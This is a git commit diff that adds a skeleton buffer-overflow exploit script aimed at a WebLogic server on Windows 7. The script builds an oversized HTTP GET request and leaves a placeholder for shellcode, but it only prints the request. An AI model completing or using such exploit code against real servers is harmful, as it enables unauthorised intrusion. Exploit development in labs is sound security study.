fc464f47be64c1ad6ce50282bd85482d10237c86
Jigyass <jigyassharma08@gmail.com>
2023-09-25 23:09:02 -0500

    Created the basic schematic for the exploit that should run on windows 7

--- BufferOverflow_windows/BufferOverflow_win7.py
+++ BufferOverflow_windows/BufferOverflow_win7.py
@@ -1,4 +1,14 @@
 import os
 import socket
 
+#This is the area for the shell code which will be put inside the buffer. 
 
+
+#This variable is essentially the payload that will be sent to the weblogic server
+buf = b"A" * 5000
+
+#HTTP GET request
+request = f"GET /weblogic/{buf}\r\n\r\n"
+
+#Print the function and use it in the terminal
+print(request)
